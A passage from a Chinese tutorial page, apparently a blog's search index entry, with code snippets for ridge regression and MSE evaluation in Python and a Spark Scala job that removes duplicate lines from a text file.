class="string">&#x27;red&#x27;</span>)</span><br><span class="line">plt.xlim([-<span class="number">10</span>, <span class="number">50</span>])</span><br><span class="line">plt.tight_layout()</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h4 id="利用岭回归建模"><a class="header-anchor" href="#利用岭回归建模">¶</a>利用岭回归建模</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> genfromtxt</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model</span><br><span class="line">model=linear_model.RidgeCV()<span class="comment">#验证岭回归</span></span><br><span class="line">model.fit(x_train,y_train)</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/88.png" alt=""></p>
<h4 id="模型评估-mse"><a class="header-anchor" href="#模型评估-mse">¶</a>模型评估 mse</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">mse_test=np.<span class="built_in">sum</span>((y_test_pred-y_test)**<span class="number">2</span>/<span class="built_in">len</span>(y_test))</span><br><span class="line">mse_test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y_predict=model.predict(x_test)</span><br><span class="line">mse_predict = mean_squared_error(y_test, y_predict)</span><br><span class="line"><span class="built_in">print</span>(y_predict)</span><br><span class="line"><span class="built_in">print</span>(mse_predict)</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/89.png" alt=""></p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/90.png" alt=""></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.spark.SparkContext </span><br><span class="line"><span class="keyword">import</span> org.apache.spark.SparkContext._ </span><br><span class="line"><span class="keyword">import</span> org.apache.spark.SparkConf </span><br><span class="line"><span class="keyword">import</span> org.apache.spark.HashPartitioner </span><br><span class="line">object RemDup &#123; </span><br><span class="line"><span class="function">def <span class="title">main</span><span class="params">(args: Array[String])</span> </span>&#123; </span><br><span class="line">val conf = <span class="keyword">new</span> SparkConf().setAppName(<span class="string">&quot;RemDup&quot;</span>) </span><br><span class="line">val sc = <span class="keyword">new</span> SparkContext(conf) </span><br><span class="line">val dataFile = <span class="string">&quot;file:///home/charles/data&quot;</span> </span><br><span class="line">val data = sc.textFile(dataFile,<span class="number">2</span>) val res = data.filter(_.trim().length&gt;<span class="number">0</span>).map(line=&gt;(line.trim,<span class="string">&quot;&quot;</span>)).partitionBy(<span class="keyword">new</span> HashPartitioner(<span class="number">1</span>)).groupByKey().sortByKey().keys res.saveAsTextFile(<span class="string">&quot;result&quot;</span>) </span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
</search>
